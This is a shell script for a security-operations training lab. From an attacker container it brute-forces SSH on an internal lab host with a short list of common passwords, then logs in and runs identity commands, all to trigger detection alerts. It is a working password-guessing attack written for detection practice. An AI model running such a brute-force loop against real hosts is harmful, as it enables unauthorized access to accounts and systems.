#!/bin/sh
# Phase 1: SSH Brute Force — runs inside Alpine attacker container
TARGET=172.20.0.4
PORT=22
USER=labuser

echo "============================================================"
echo "SOC Lab -- Phase 1: SSH Brute Force"
echo "Target: ${TARGET}:${PORT}"
echo "Expected alerts: Rule 100001 (level 10), Rule 100003 (level 14 CRITICAL)"
echo "============================================================"
echo

COUNT=1
TOTAL=11

for pass in admin 123456 letmein monkey qwerty abc123 password iloveyou sunshine princess; do
  printf "[%02d/%02d] Trying %s:%s ... " "$COUNT" "$TOTAL" "$USER" "$pass"
  sshpass -p "$pass" ssh \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=3 \
    -o BatchMode=no \
    -p "$PORT" "$USER@$TARGET" 'exit' 2>/dev/null \
    && echo "SUCCESS" || echo "FAILED"
  COUNT=$((COUNT + 1))
  sleep 0.3
done

echo
echo ">>> Rule 100001 should have fired (8+ failures in 2 min) <<<"
echo

printf "[%02d/%02d] Trying %s:%s ... " "$COUNT" "$TOTAL" "$USER" "password123"
sshpass -p "password123" ssh \
  -o StrictHostKeyChecking=no \
  -o ConnectTimeout=5 \
  -o BatchMode=no \
  -p "$PORT" "$USER@$TARGET" \
  'echo ""; id; hostname; echo "ATTACKER_GOT_SHELL"' 2>/dev/null \
  && echo "(login confirmed)" || echo "FAILED"

echo
echo ">>> Rule 100003 CRITICAL should have fired (success after brute force) <<<"
echo "    Dashboard: https://localhost"
echo "    Filter: rule.id: 100003 OR rule.groups: soc_lab_alert"
